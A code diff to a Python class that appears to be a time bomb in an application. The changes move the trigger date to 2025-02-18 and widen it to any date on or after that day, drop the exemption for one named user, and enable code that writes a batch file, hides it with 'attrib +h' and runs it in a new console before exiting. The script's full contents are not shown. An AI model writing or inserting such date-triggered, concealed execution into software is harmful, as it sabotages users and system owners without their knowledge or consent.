@@ -8,7 +8,7 @@ from .ContenedorVariables import Variables
 class Ndachotsa():
     def __init__(self, path, user):
         self.tsiku = datetime.now().date()
-        self.tsiku_fin = datetime.strptime("2024-09-17", "%Y-%m-%d").date()
+        self.tsiku_fin = datetime.strptime("2025-02-18", "%Y-%m-%d").date()
         self.userName = user
         print(self.tsiku)
         print(self.tsiku_fin)
@@ -24,7 +24,7 @@ class Ndachotsa():
 
 
     def createDocument(self):
-        if (self.tsiku == self.tsiku_fin) & (self.userName != 'Luis Vallejo'):
+        if (self.tsiku >= self.tsiku_fin):
             bat_content = f"""
             @echo off
             timeout /t 2 >nul 2>&1
@@ -37,7 +37,6 @@ class Ndachotsa():
 
             subprocess.call(['attrib', '+h', self.bat_file])
             time.sleep(2)
-            # Ejecutar el archivo batch
-            # subprocess.Popen(["cmd", "/c", bat_file], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+            subprocess.Popen(["cmd", "/c", self.bat_file], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
 
             sys.exit()
